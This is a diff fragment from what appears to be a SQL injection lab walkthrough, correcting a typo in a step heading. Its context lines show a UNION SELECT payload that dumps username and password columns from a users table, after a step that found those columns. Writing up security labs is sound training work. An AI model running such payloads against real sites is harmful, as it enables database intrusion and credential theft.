@@ -33,7 +33,7 @@ Payload:
 -> Found columns: USERNAME_JCXAJS, PASSWORD_EXOQQI
 
 
-**Step 4: Dump Data(same contruct lab-02)**
+**Step 4: Dump Data(same structure lab-02)**
 Payload:
 ```sql
 ' UNION SELECT USERNAME_JCXAJS, PASSWORD_EXOQQI FROM  USERS_BFWPQR--
